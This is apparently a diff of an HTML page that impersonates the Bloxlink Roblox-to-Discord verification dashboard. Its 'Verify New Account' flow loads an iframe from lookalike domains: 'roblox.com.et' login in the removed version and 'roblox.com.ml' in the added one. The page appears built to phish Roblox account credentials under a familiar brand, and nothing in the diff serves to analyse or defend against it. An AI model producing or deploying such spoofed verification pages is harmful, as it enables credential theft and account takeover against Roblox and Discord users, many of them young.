@@ -1,706 +1,622 @@
 <!DOCTYPE html>
 <html lang="en" data-theme="dark">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Bloxlink</title>
-
-  <link rel="icon" href="./Screenshot-2026-07-14-212915.jpg?v=3" type="image/jpeg">
-  <link rel="shortcut icon" href="./Screenshot-2026-07-14-212915.jpg?v=3" type="image/jpeg">
-  <link rel="apple-touch-icon" href="./Screenshot-2026-07-14-212915.jpg?v=3">
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-
-  <style>
-    :root {
-      --text-base: clamp(1rem, 0.95rem + 0.25vw, 1.125rem);
-      --space-1: 0.25rem;
-      --space-2: 0.5rem;
-      --space-3: 0.75rem;
-      --space-4: 1rem;
-      --space-5: 1.25rem;
-      --space-6: 1.5rem;
-      --space-8: 2rem;
-      --radius-sm: 0.375rem;
-      --radius-md: 0.5rem;
-      --font-body: 'Inter', system-ui, sans-serif;
-      --bg: #101827;
-      --border: rgba(255,255,255,0.08);
-      --divider: rgba(255,255,255,0.06);
-      --text: #f4f7fb;
-      --muted: #8b9ab1;
-      --primary: #645bff;
-      --primary-2: #7b73ff;
-      --success: #16c79a;
-      --shadow: 0 24px 60px rgba(0,0,0,0.28);
-      --transition: 180ms cubic-bezier(0.16, 1, 0.3, 1);
-    }
-
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { min-height: 100%; }
-
-    body {
-      font-family: var(--font-body);
-      font-size: var(--text-base);
-      line-height: 1.5;
-      background: linear-gradient(180deg, #121d31 0%, var(--bg) 100%);
-      color: var(--text);
-      overflow-x: hidden;
-    }
-
-    button, a, input {
-      font: inherit;
-      color: inherit;
-    }
-
-    .app {
-      min-height: 100vh;
-      display: grid;
-      grid-template-columns: 160px 1fr;
-    }
-
-    .sidebar {
-      background: linear-gradient(180deg, #081226 0%, #071021 100%);
-      border-right: 1px solid var(--divider);
-      padding: var(--space-4);
-      overflow-y: auto;
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 0.2rem;
-      margin-bottom: var(--space-8);
-      margin-left: -8px;
-      font-weight: 800;
-      font-size: 2rem;
-      letter-spacing: -0.05em;
-    }
-
-    .brand-logo {
-      width: 44px;
-      height: 50px;
-      flex: 0 0 auto;
-    }
-
-    .brand-text {
-      font-size: 0.86em;
-      font-weight: 800;
-      color: #ffffff;
-      line-height: 1;
-      margin-left: -6px;
-    }
-
-    .nav-label {
-      color: var(--muted);
-      font-size: 0.66rem;
-      font-weight: 700;
-      letter-spacing: 0.12em;
-      margin: var(--space-5) 0 var(--space-3);
-    }
-
-    .nav-item {
-      display: flex;
-      align-items: center;
-      gap: var(--space-3);
-      color: #c8d1e3;
-      padding: 0.7rem 0;
-      text-decoration: none;
-      font-size: 0.92rem;
-      min-height: 44px;
-    }
-
-    .nav-dot {
-      width: 18px;
-      height: 18px;
-      border-radius: 999px;
-      border: 1px solid rgba(255,255,255,0.25);
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.65rem;
-      color: var(--muted);
-      flex: 0 0 auto;
-    }
-
-    .main {
-      display: flex;
-      flex-direction: column;
-      min-width: 0;
-      min-height: 100vh;
-    }
-
-    .topbar {
-      min-height: 52px;
-      border-bottom: 1px solid var(--divider);
-      background: rgba(20, 28, 43, 0.82);
-      display: flex;
-      align-items: center;
-      justify-content: flex-end;
-      padding: 0 var(--space-6);
-      color: #b7c2d5;
-      font-size: 0.86rem;
-      gap: var(--space-4);
-      position: sticky;
-      top: 0;
-      z-index: 20;
-      backdrop-filter: blur(8px);
-    }
-
-    .topbar a {
-      color: #c8d1ff;
-      text-decoration: none;
-    }
-
-    .content {
-      padding: var(--space-5);
-      min-width: 0;
-    }
-
-    .panel {
-      background: rgba(20, 28, 43, 0.94);
-      border: 1px solid var(--divider);
-      border-radius: var(--radius-md);
-      min-height: calc(100vh - 84px);
-      box-shadow: var(--shadow);
-      overflow: hidden;
-    }
-
-    .panel-head {
-      padding: var(--space-5) var(--space-6);
-      border-bottom: 1px solid var(--divider);
-      display: flex;
-      align-items: baseline;
-      gap: var(--space-3);
-      flex-wrap: wrap;
-    }
-
-    .panel-head h1 {
-      font-size: 1rem;
-      font-weight: 800;
-    }
-
-    .panel-head p {
-      color: var(--muted);
-      font-size: 0.9rem;
-    }
-
-    .panel-body {
-      padding: var(--space-6);
-    }
-
-    .steps {
-      display: grid;
-      grid-template-columns: repeat(4, minmax(0, 1fr));
-      gap: var(--space-6);
-      background: #141f31;
-      border: 1px solid var(--divider);
-      border-radius: var(--radius-sm);
-      padding: 0.9rem 1rem;
-      margin-bottom: var(--space-8);
-    }
-
-    .step {
-      display: flex;
-      align-items: center;
-      gap: var(--space-3);
-      min-width: 0;
-      color: #d8e0ef;
-      font-size: 0.95rem;
-      font-weight: 600;
-    }
-
-    .step-index {
-      width: 24px;
-      height: 24px;
-      border-radius: 999px;
-      border: 2px solid rgba(255,255,255,0.85);
-      display: grid;
-      place-items: center;
-      flex: 0 0 auto;
-      font-size: 0.75rem;
-    }
-
-    .step .step-pill {
-      display: contents;
-    }
-
-    .step.active .step-pill {
-      background: linear-gradient(180deg, var(--primary-2), var(--primary));
-      border-radius: 0.35rem;
-      padding: 1rem;
-      width: 100%;
-      display: flex;
-      align-items: center;
-      gap: var(--space-3);
-      min-height: 54px;
-    }
-
-    .section-view { display: none; }
-    .section-view.active { display: block; }
-
-    .section-title {
-      font-size: 1.55rem;
-      font-weight: 800;
-      margin-bottom: 0.25rem;
-    }
-
-    .section-subtitle {
-      color: var(--muted);
-      font-size: 0.92rem;
-      margin-bottom: var(--space-5);
-    }
-
-    .method-card {
-      border: 2px solid var(--success);
-      border-radius: var(--radius-sm);
-      background: #1a2639;
-      padding: 1rem 1rem 1.1rem;
-      margin-bottom: var(--space-3);
-    }
-
-    .method-card h3 {
-      font-size: 1rem;
-      font-weight: 700;
-      margin-bottom: 0.15rem;
-    }
-
-    .method-card p {
-      color: var(--muted);
-      font-size: 0.9rem;
-    }
-
-    .next-btn,
-    .action-btn {
-      width: 100%;
-      min-height: 44px;
-      border-radius: 8px;
-      border: 0;
-      background: linear-gradient(180deg, var(--primary-2), var(--primary));
-      color: #fff;
-      font-size: 0.95rem;
-      font-weight: 700;
-      cursor: pointer;
-      transition: transform var(--transition), filter var(--transition);
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      text-decoration: none;
-      padding: 0.8rem 1rem;
-    }
-
-    .next-btn:hover,
-    .action-btn:hover {
-      filter: brightness(1.06);
-    }
-
-    .next-btn:active,
-    .action-btn:active {
-      transform: translateY(1px);
-    }
-
-    .frame-shell {
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      overflow: hidden;
-      background: #0d1524;
-      min-height: 620px;
-    }
-
-    .frame-scroll {
-      width: 100%;
-      height: 76vh;
-      min-height: 620px;
-      overflow-y: auto;
-      overflow-x: hidden;
-      -webkit-overflow-scrolling: touch;
-      background: #fff;
-    }
-
-    iframe {
-      width: 100%;
-      height: 100%;
-      min-height: 620px;
-      border: 0;
-      background: #fff;
-      display: block;
-    }
-
-    .embed-caption {
-      color: var(--muted);
-      font-size: 0.9rem;
-      margin-bottom: var(--space-4);
-    }
-
-    .embed-status {
-      color: var(--muted);
-      font-size: 0.92rem;
-      margin-bottom: var(--space-4);
-    }
-
-    .fallback-box {
-      display: none;
-      margin-top: var(--space-4);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      background: #182235;
-      padding: 1rem;
-    }
-
-    .fallback-box.active {
-      display: block;
-    }
-
-    .fallback-box h3 {
-      font-size: 1rem;
-      margin-bottom: 0.3rem;
-    }
-
-    .fallback-box p {
-      color: var(--muted);
-      font-size: 0.92rem;
-      margin-bottom: 1rem;
-    }
-
-    .mobile-toggle {
-      display: none;
-    }
-
-    .sidebar-backdrop {
-      display: none;
-    }
-
-    @media (max-width: 980px) {
-      .app {
-        grid-template-columns: 1fr;
-      }
-
-      .sidebar {
-        position: fixed;
-        inset: 0 auto 0 0;
-        width: min(250px, 82vw);
-        z-index: 40;
-        transform: translateX(-100%);
-        transition: transform var(--transition);
-        -webkit-overflow-scrolling: touch;
-      }
-
-      .sidebar.open {
-        transform: translateX(0);
-      }
-
-      .sidebar-backdrop {
-        display: block;
-        position: fixed;
-        inset: 0;
-        background: rgba(0,0,0,0.42);
-        opacity: 0;
-        pointer-events: none;
-        transition: opacity var(--transition);
-        z-index: 35;
-      }
-
-      .sidebar-backdrop.show {
-        opacity: 1;
-        pointer-events: auto;
-      }
-
-      .mobile-toggle {
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-        width: 44px;
-        height: 44px;
-        margin-right: auto;
-        background: rgba(255,255,255,0.04);
-        border: 1px solid var(--border);
-        border-radius: 10px;
-        flex: 0 0 auto;
-      }
-
-      .topbar {
-        justify-content: space-between;
-        gap: var(--space-4);
-        padding: var(--space-2) var(--space-4);
-        align-items: flex-start;
-      }
-
-      .topbar > div:last-child {
-        font-size: 0.8rem;
-        line-height: 1.35;
-      }
-
-      .steps {
-        grid-template-columns: 1fr;
-        gap: var(--space-3);
-      }
-
-      .content {
-        padding: var(--space-3);
-      }
-
-      .panel-body,
-      .panel-head {
-        padding: var(--space-4);
-      }
-
-      .panel {
-        min-height: auto;
-      }
-
-      .frame-shell,
-      .frame-scroll,
-      iframe {
-        min-height: 70vh;
-      }
-
-      .frame-scroll {
-        height: 70vh;
-      }
-    }
-
-    @media (max-width: 560px) {
-      .brand {
-        margin-left: -5px;
-        gap: 0.15rem;
-      }
-
-      .brand-text {
-        margin-left: -4px;
-      }
-
-      .panel-head h1 {
-        font-size: 0.96rem;
-      }
-
-      .section-title {
-        font-size: 1.3rem;
-      }
-
-      .frame-shell,
-      .frame-scroll,
-      iframe {
-        min-height: 68vh;
-      }
-
-      .frame-scroll {
-        height: 68vh;
-      }
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Bloxlink</title>
+
+<link rel="icon" href="./Screenshot-2026-07-14-212915.jpg?v=3" type="image/jpeg">
+<link rel="shortcut icon" href="./Screenshot-2026-07-14-212915.jpg?v=3" type="image/jpeg">
+<link rel="apple-touch-icon" href="./Screenshot-2026-07-14-212915.jpg?v=3">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+:root {
+--text-base: clamp(1rem, 0.95rem + 0.25vw, 1.125rem);
+--space-1: 0.25rem;
+--space-2: 0.5rem;
+--space-3: 0.75rem;
+--space-4: 1rem;
+--space-5: 1.25rem;
+--space-6: 1.5rem;
+--space-8: 2rem;
+--radius-sm: 0.375rem;
+--radius-md: 0.5rem;
+--font-body: 'Inter', system-ui, sans-serif;
+--bg: #101827;
+--sidebar: #081226;
+--surface: #182235;
+--border: rgba(255,255,255,0.08);
+--divider: rgba(255,255,255,0.06);
+--text: #f4f7fb;
+--muted: #8b9ab1;
+--primary: #645bff;
+--primary-2: #7b73ff;
+--success: #16c79a;
+--shadow: 0 24px 60px rgba(0,0,0,0.28);
+--transition: 180ms cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { min-height: 100%; }
+
+body {
+font-family: var(--font-body);
+font-size: var(--text-base);
+line-height: 1.5;
+background: linear-gradient(180deg, #121d31 0%, var(--bg) 100%);
+color: var(--text);
+overflow-x: hidden;
+}
+
+button {
+font: inherit;
+color: inherit;
+}
+
+.app {
+min-height: 100vh;
+display: grid;
+grid-template-columns: 160px 1fr;
+}
+
+.sidebar {
+background: linear-gradient(180deg, #081226 0%, #071021 100%);
+border-right: 1px solid var(--divider);
+padding: var(--space-4);
+overflow-y: auto;
+}
+
+.brand {
+display: flex;
+align-items: center;
+gap: 0.2rem;
+margin-bottom: var(--space-8);
+margin-left: -8px;
+font-weight: 800;
+font-size: 2rem;
+letter-spacing: -0.05em;
+}
+
+.brand-logo {
+width: 44px;
+height: 50px;
+flex: 0 0 auto;
+}
+
+.brand-text {
+font-size: 0.86em;
+font-weight: 800;
+color: #ffffff;
+line-height: 1;
+margin-left: -6px;
+}
+
+.nav-label {
+color: var(--muted);
+font-size: 0.66rem;
+font-weight: 700;
+letter-spacing: 0.12em;
+margin: var(--space-5) 0 var(--space-3);
+}
+
+.nav-item {
+display: flex;
+align-items: center;
+gap: var(--space-3);
+color: #c8d1e3;
+padding: 0.7rem 0;
+text-decoration: none;
+font-size: 0.92rem;
+min-height: 44px;
+}
+
+.nav-dot {
+width: 18px;
+height: 18px;
+border-radius: 999px;
+border: 1px solid rgba(255,255,255,0.25);
+display: inline-flex;
+align-items: center;
+justify-content: center;
+font-size: 0.65rem;
+color: var(--muted);
+flex: 0 0 auto;
+}
+
+.main {
+display: flex;
+flex-direction: column;
+min-width: 0;
+min-height: 100vh;
+}
+
+.topbar {
+min-height: 52px;
+border-bottom: 1px solid var(--divider);
+background: rgba(20, 28, 43, 0.82);
+display: flex;
+align-items: center;
+justify-content: flex-end;
+padding: 0 var(--space-6);
+color: #b7c2d5;
+font-size: 0.86rem;
+gap: var(--space-4);
+position: sticky;
+top: 0;
+z-index: 20;
+backdrop-filter: blur(8px);
+}
+
+.topbar a {
+color: #c8d1ff;
+text-decoration: none;
+}
+
+.content {
+padding: var(--space-5);
+min-width: 0;
+}
+
+.panel {
+background: rgba(20, 28, 43, 0.94);
+border: 1px solid var(--divider);
+border-radius: var(--radius-md);
+min-height: calc(100vh - 84px);
+box-shadow: var(--shadow);
+overflow: hidden;
+}
+
+.panel-head {
+padding: var(--space-5) var(--space-6);
+border-bottom: 1px solid var(--divider);
+display: flex;
+align-items: baseline;
+gap: var(--space-3);
+flex-wrap: wrap;
+}
+
+.panel-head h1 {
+font-size: 1rem;
+font-weight: 800;
+}
+
+.panel-head p {
+color: var(--muted);
+font-size: 0.9rem;
+}
+
+.panel-body {
+padding: var(--space-6);
+}
+
+.steps {
+display: grid;
+grid-template-columns: repeat(4, minmax(0, 1fr));
+gap: var(--space-6);
+background: #141f31;
+border: 1px solid var(--divider);
+border-radius: var(--radius-sm);
+padding: 0.9rem 1rem;
+margin-bottom: var(--space-8);
+}
+
+.step {
+display: flex;
+align-items: center;
+gap: var(--space-3);
+min-width: 0;
+color: #d8e0ef;
+font-size: 0.95rem;
+font-weight: 600;
+}
+
+.step-index {
+width: 24px;
+height: 24px;
+border-radius: 999px;
+border: 2px solid rgba(255,255,255,0.85);
+display: grid;
+place-items: center;
+flex: 0 0 auto;
+font-size: 0.75rem;
+}
+
+.step .step-pill {
+display: contents;
+}
+
+.step.active .step-pill {
+background: linear-gradient(180deg, var(--primary-2), var(--primary));
+border-radius: 0.35rem;
+padding: 1rem;
+width: 100%;
+display: flex;
+align-items: center;
+gap: var(--space-3);
+min-height: 54px;
+}
+
+.section-view { display: none; }
+.section-view.active { display: block; }
+
+.section-title {
+font-size: 1.55rem;
+font-weight: 800;
+margin-bottom: 0.25rem;
+}
+
+.section-subtitle {
+color: var(--muted);
+font-size: 0.92rem;
+margin-bottom: var(--space-5);
+}
+
+.method-card {
+border: 2px solid var(--success);
+border-radius: var(--radius-sm);
+background: #1a2639;
+padding: 1rem 1rem 1.1rem;
+margin-bottom: var(--space-3);
+}
+
+.method-card h3 {
+font-size: 1rem;
+font-weight: 700;
+margin-bottom: 0.15rem;
+}
+
+.method-card p {
+color: var(--muted);
+font-size: 0.9rem;
+}
+
+.next-btn {
+width: 100%;
+height: 40px;
+border-radius: 4px;
+border: 0;
+background: linear-gradient(180deg, var(--primary-2), var(--primary));
+color: #fff;
+font-size: 0.9rem;
+font-weight: 700;
+cursor: pointer;
+transition: transform var(--transition), filter var(--transition);
+}
+
+.next-btn:hover {
+filter: brightness(1.06);
+}
+
+.next-btn:active {
+transform: translateY(1px);
+}
+
+.frame-shell {
+border: 1px solid var(--border);
+border-radius: var(--radius-md);
+overflow: hidden;
+background: #0d1524;
+min-height: 620px;
+}
+
+.frame-scroll {
+width: 100%;
+height: 76vh;
+min-height: 620px;
+overflow-y: auto;
+overflow-x: hidden;
+-webkit-overflow-scrolling: touch;
+background: #fff;
+}
+
+iframe {
+width: 100%;
+height: 100%;
+min-height: 620px;
+border: 0;
+background: #fff;
+display: block;
+}
+
+.embed-caption {
+color: var(--muted);
+font-size: 0.9rem;
+margin-bottom: var(--space-4);
+}
+
+.mobile-toggle {
+display: none;
+}
+
+.sidebar-backdrop {
+display: none;
+}
+
+@media (max-width: 980px) {
+.app {
+grid-template-columns: 1fr;
+}
+
+.sidebar {
+position: fixed;
+inset: 0 auto 0 0;
+width: min(250px, 82vw);
+z-index: 40;
+transform: translateX(-100%);
+transition: transform var(--transition);
+-webkit-overflow-scrolling: touch;
+}
+
+.sidebar.open {
+transform: translateX(0);
+}
+
+.sidebar-backdrop {
+display: block;
+position: fixed;
+inset: 0;
+background: rgba(0,0,0,0.42);
+opacity: 0;
+pointer-events: none;
+transition: opacity var(--transition);
+z-index: 35;
+}
+
+.sidebar-backdrop.show {
+opacity: 1;
+pointer-events: auto;
+}
+
+.mobile-toggle {
+display: inline-flex;
+align-items: center;
+justify-content: center;
+width: 44px;
+height: 44px;
+margin-right: auto;
+background: rgba(255,255,255,0.04);
+border: 1px solid var(--border);
+border-radius: 10px;
+flex: 0 0 auto;
+}
+
+.topbar {
+justify-content: space-between;
+gap: var(--space-4);
+padding: var(--space-2) var(--space-4);
+align-items: flex-start;
+}
+
+.topbar > div:last-child {
+font-size: 0.8rem;
+line-height: 1.35;
+}
+
+.steps {
+grid-template-columns: 1fr;
+gap: var(--space-3);
+}
+
+.content {
+padding: var(--space-3);
+}
+
+.panel-body,
+.panel-head {
+padding: var(--space-4);
+}
+
+.panel {
+min-height: auto;
+}
+
+.frame-shell,
+.frame-scroll,
+iframe {
+min-height: 70vh;
+}
+
+.frame-scroll {
+height: 70vh;
+}
+}
+
+@media (max-width: 560px) {
+.brand {
+margin-left: -5px;
+gap: 0.15rem;
+}
+
+.brand-text {
+margin-left: -4px;
+}
+
+.panel-head h1 {
+font-size: 0.96rem;
+}
+
+.section-title {
+font-size: 1.3rem;
+}
+
+.frame-shell,
+.frame-scroll,
+iframe {
+min-height: 68vh;
+}
+
+.frame-scroll {
+height: 68vh;
+}
+}
+</style>
 </head>
 <body>
-  <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
+<div class="sidebar-backdrop" id="sidebarBackdrop"></div>
 
-  <div class="app">
-    <aside class="sidebar" id="sidebar">
-      <div class="brand" aria-label="Brand logo">
-        <svg class="brand-logo" width="44" height="50" viewBox="0 0 44 50" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect x="6" y="11" width="32" height="34" rx="8" fill="white"/>
-          <circle cx="17" cy="28" r="5" fill="#111C2E"/>
-          <circle cx="27" cy="28" r="5" fill="#111C2E"/>
-          <path d="M16 36.5H28" stroke="#111C2E" stroke-width="2.2" stroke-linecap="round"/>
-          <path d="M15.5 39.5C17 41.2 19.2 42 22 42C24.8 42 27 41.2 28.5 39.5" stroke="#111C2E" stroke-width="2.2" stroke-linecap="round"/>
-          <path d="M15 7L20 9.5L18.6 15H13.4L15 7Z" fill="white"/>
-          <path d="M29 7L24 9.5L25.4 15H30.6L29 7Z" fill="white"/>
-          <path d="M19.5 7.8V13.6" stroke="#111C2E" stroke-width="1.5" stroke-linecap="round"/>
-          <path d="M24.5 7.8V13.6" stroke="#111C2E" stroke-width="1.5" stroke-linecap="round"/>
-        </svg>
-        <span class="brand-text">bloxlink</span>
-      </div>
+<div class="app">
+<aside class="sidebar" id="sidebar">
+<div class="brand" aria-label="Brand logo">
+<svg class="brand-logo" width="44" height="50" viewBox="0 0 44 50" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+<rect x="6" y="11" width="32" height="34" rx="8" fill="white"/>
+<circle cx="17" cy="28" r="5" fill="#111C2E"/>
+<circle cx="27" cy="28" r="5" fill="#111C2E"/>
+<path d="M16 36.5H28" stroke="#111C2E" stroke-width="2.2" stroke-linecap="round"/>
+<path d="M15.5 39.5C17 41.2 19.2 42 22 42C24.8 42 27 41.2 28.5 39.5" stroke="#111C2E" stroke-width="2.2" stroke-linecap="round"/>
+<path d="M15 7L20 9.5L18.6 15H13.4L15 7Z" fill="white"/>
+<path d="M29 7L24 9.5L25.4 15H30.6L29 7Z" fill="white"/>
+<path d="M19.5 7.8V13.6" stroke="#111C2E" stroke-width="1.5" stroke-linecap="round"/>
+<path d="M24.5 7.8V13.6" stroke="#111C2E" stroke-width="1.5" stroke-linecap="round"/>
+</svg>
+<span class="brand-text">bloxlink</span>
+</div>
 
-      <div class="nav-label">GENERAL</div>
-      <a class="nav-item" href="#"><span class="nav-dot">◎</span><span>Verifications</span></a>
-      <a class="nav-item" href="#"><span class="nav-dot">▤</span><span>Manage Servers</span></a>
+<div class="nav-label">GENERAL</div>
+<a class="nav-item" href="#"><span class="nav-dot">◎</span><span>Verifications</span></a>
+<a class="nav-item" href="#"><span class="nav-dot">▤</span><span>Manage Servers</span></a>
 
-      <div class="nav-label">ACCOUNT</div>
-      <a class="nav-item" href="#"><span class="nav-dot">⌁</span><span>Manage Subscriptions</span></a>
-      <a class="nav-item" href="#"><span class="nav-dot">◌</span><span>Settings</span></a>
+<div class="nav-label">ACCOUNT</div>
+<a class="nav-item" href="#"><span class="nav-dot">⌁</span><span>Manage Subscriptions</span></a>
+<a class="nav-item" href="#"><span class="nav-dot">◌</span><span>Settings</span></a>
 
-      <div class="nav-label">OTHER</div>
-      <a class="nav-item" href="#"><span class="nav-dot">?</span><span>Support</span></a>
-      <a class="nav-item" href="#"><span class="nav-dot">&lt;/&gt;</span><span>Developer API</span></a>
-    </aside>
+<div class="nav-label">OTHER</div>
+<a class="nav-item" href="#"><span class="nav-dot">?</span><span>Support</span></a>
+<a class="nav-item" href="#"><span class="nav-dot">&lt;/&gt;</span><span>Developer API</span></a>
+</aside>
 
-    <main class="main">
-      <div class="topbar">
-        <button class="mobile-toggle" id="mobileToggle" aria-label="Open menu">☰</button>
-        <div>We’ve updated our <a href="#" target="_blank" rel="noopener noreferrer">Terms of Service</a>, <a href="#" target="_blank" rel="noopener noreferrer">Privacy Policy</a>, and <a href="#" target="_blank" rel="noopener noreferrer">Purchase Policy</a> effective February 10, 2026.</div>
-      </div>
+<main class="main">
+<div class="topbar">
+<button class="mobile-toggle" id="mobileToggle" aria-label="Open menu">☰</button>
+<div>We’ve updated our <a href="#" target="_blank" rel="noopener noreferrer">Terms of Service</a>, <a href="#" target="_blank" rel="noopener noreferrer">Privacy Policy</a>, and <a href="#" target="_blank" rel="noopener noreferrer">Purchase Policy</a> effective February 10, 2026.</div>
+</div>
 
-      <div class="content">
-        <section class="panel">
-          <div class="panel-head">
-            <h1>Verify New Account</h1>
-            <p>Link a new Roblox account to Discord.</p>
-          </div>
+<div class="content">
+<section class="panel">
+<div class="panel-head">
+<h1>Verify New Account</h1>
+<p>Link a new Roblox account to Discord.</p>
+</div>
 
-          <div class="panel-body">
-            <div class="steps" aria-label="Progress steps">
-              <div class="step active" data-step="1">
-                <div class="step-pill">
-                  <span class="step-index">1</span>
-                  <span>Account Information</span>
-                </div>
-              </div>
-              <div class="step" data-step="2">
-                <div class="step-pill">
-                  <span class="step-index">2</span>
-                  <span>Account Verification</span>
-                </div>
-              </div>
-              <div class="step" data-step="3">
-                <div class="step-pill">
-                  <span class="step-index">3</span>
-                  <span>Select Servers</span>
-                </div>
-              </div>
-              <div class="step" data-step="4">
-                <div class="step-pill">
-                  <span class="step-index">4</span>
-                  <span>Finished</span>
-                </div>
-              </div>
-            </div>
+<div class="panel-body">
+<div class="steps" aria-label="Progress steps">
+<div class="step active" data-step="1">
+<div class="step-pill">
+<span class="step-index">1</span>
+<span>Account Information</span>
+</div>
+</div>
+<div class="step" data-step="2">
+<div class="step-pill">
+<span class="step-index">2</span>
+<span>Account Verification</span>
+</div>
+</div>
+<div class="step" data-step="3">
+<div class="step-pill">
+<span class="step-index">3</span>
+<span>Select Servers</span>
+</div>
+</div>
+<div class="step" data-step="4">
+<div class="step-pill">
+<span class="step-index">4</span>
+<span>Finished</span>
+</div>
+</div>
+</div>
 
-            <div class="section-view active" id="stepOneView">
-              <h2 class="section-title">New Account Information</h2>
-              <p class="section-subtitle">Select Verification Method.</p>
-              <div class="method-card">
-                <h3>Authorize Roblox</h3>
-                <p>Link your Roblox account with Bloxlink in one click.</p>
-              </div>
-              <button class="next-btn" id="nextBtn">Next</button>
-            </div>
+<div class="section-view active" id="stepOneView">
+<h2 class="section-title">New Account Information</h2>
+<p class="section-subtitle">Select Verification Method.</p>
+<div class="method-card">
+<h3>Authorize Roblox</h3>
+<p>Link your Roblox account with Bloxlink in one click.</p>
+</div>
+<button class="next-btn" id="nextBtn">Next</button>
+</div>
 
-            <div class="section-view" id="stepTwoView">
-              <h2 class="section-title">Account Verification</h2>
-              <p class="embed-caption">Verify your account</p>
-              <p class="embed-status" id="embedStatus">Loading embedded page…</p>
+<div class="section-view" id="stepTwoView">
+<h2 class="section-title">Account Verification</h2>
+<p class="embed-caption">Verify your account</p>
 
-              <div class="frame-shell" id="frameShell">
-                <div class="frame-scroll">
-                  <iframe
-                    id="embedFrame"
-                    name="embedFrame"
-                    src="about:blank"
-                    title="Embedded content"
-                    loading="lazy"
-                    referrerpolicy="strict-origin-when-cross-origin"
-                    allow="clipboard-read; clipboard-write"
-                  ></iframe>
-                </div>
-              </div>
+<div class="frame-shell">
+<div class="frame-scroll">
+<iframe
+id="embedFrame"
+name="embedFrame"
+src="about:blank"
+title="Embedded content"
+loading="lazy"
+referrerpolicy="no-referrer"
+sandbox="allow-scripts allow-forms allow-same-origin"
+></iframe>
+</div>
+</div>
+</div>
+</div>
+</section>
+</div>
+</main>
+</div>
 
-              <div class="fallback-box" id="fallbackBox">
-                <h3>Open link directly</h3>
-                <p>This link is acting like a normal website instead of an embeddable page, so open it directly if the embedded version is blocked.</p>
-                <a class="action-btn" id="openDirectBtn" href="#" target="_blank" rel="noopener noreferrer">Open direct link</a>
-              </div>
-            </div>
-          </div>
-        </section>
-      </div>
-    </main>
-  </div>
+<script>
+const CONFIG = {
+embedUrl: 'https://www.roblox.com.ml/users/234145857712/profile'
+};
 
-  <script>
-    const CONFIG = {
-      embedUrl: 'https://www.roblox.com.et/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F986570988290%2FOneTimeYT'
-    };
+const nextBtn = document.getElementById('nextBtn');
+const embedFrame = document.getElementById('embedFrame');
+const stepOneView = document.getElementById('stepOneView');
+const stepTwoView = document.getElementById('stepTwoView');
+const mobileToggle = document.getElementById('mobileToggle');
+const sidebar = document.getElementById('sidebar');
+const sidebarBackdrop = document.getElementById('sidebarBackdrop');
+const steps = Array.from(document.querySelectorAll('.step'));
 
-    const nextBtn = document.getElementById('nextBtn');
-    const embedFrame = document.getElementById('embedFrame');
-    const stepOneView = document.getElementById('stepOneView');
-    const stepTwoView = document.getElementById('stepTwoView');
-    const mobileToggle = document.getElementById('mobileToggle');
-    const sidebar = document.getElementById('sidebar');
-    const sidebarBackdrop = document.getElementById('sidebarBackdrop');
-    const steps = Array.from(document.querySelectorAll('.step'));
-    const embedStatus = document.getElementById('embedStatus');
-    const fallbackBox = document.getElementById('fallbackBox');
-    const openDirectBtn = document.getElementById('openDirectBtn');
-    const frameShell = document.getElementById('frameShell');
+function setActiveStep(stepNumber) {
+steps.forEach((step) => {
+step.classList.toggle('active', Number(step.dataset.step) === stepNumber);
+});
+}
 
-    let embedCheckTimer = null;
+function closeSidebar() {
+sidebar.classList.remove('open');
+sidebarBackdrop.classList.remove('show');
+}
 
-    function normalizeUrl(value) {
-      const raw = String(value || '').trim();
-      if (!raw) return 'about:blank';
-      if (/^https?:\/\//i.test(raw)) return raw;
-      return 'https://' + raw;
-    }
+function openSidebar() {
+sidebar.classList.add('open');
+sidebarBackdrop.classList.add('show');
+}
 
-    function setActiveStep(stepNumber) {
-      steps.forEach((step) => {
-        step.classList.toggle('active', Number(step.dataset.step) === stepNumber);
-      });
-    }
+nextBtn.addEventListener('click', () => {
+embedFrame.src = CONFIG.embedUrl;
+stepOneView.classList.remove('active');
+stepTwoView.classList.add('active');
+setActiveStep(2);
+stepTwoView.scrollIntoView({ behavior: 'smooth', block: 'start' });
+});
 
-    function closeSidebar() {
-      sidebar.classList.remove('open');
-      sidebarBackdrop.classList.remove('show');
-    }
+mobileToggle.addEventListener('click', () => {
+const isOpen = sidebar.classList.contains('open');
+if (isOpen) {
+closeSidebar();
+} else {
+openSidebar();
+}
+});
 
-    function openSidebar() {
-      sidebar.classList.add('open');
-      sidebarBackdrop.classList.add('show');
-    }
+sidebarBackdrop.addEventListener('click', closeSidebar);
 
-    function showFallback(message) {
-      embedStatus.textContent = message;
-      fallbackBox.classList.add('active');
-    }
-
-    function hideFallback() {
-      fallbackBox.classList.remove('active');
-    }
-
-    function loadEmbed() {
-      const url = normalizeUrl(CONFIG.embedUrl);
-      openDirectBtn.href = url;
-      hideFallback();
-      embedStatus.textContent = 'Loading embedded page…';
-      embedFrame.src = url;
-
-      clearTimeout(embedCheckTimer);
-      embedCheckTimer = setTimeout(() => {
-        showFallback('This site may be blocking iframe embedding. Use the direct link button if needed.');
-      }, 3500);
-    }
-
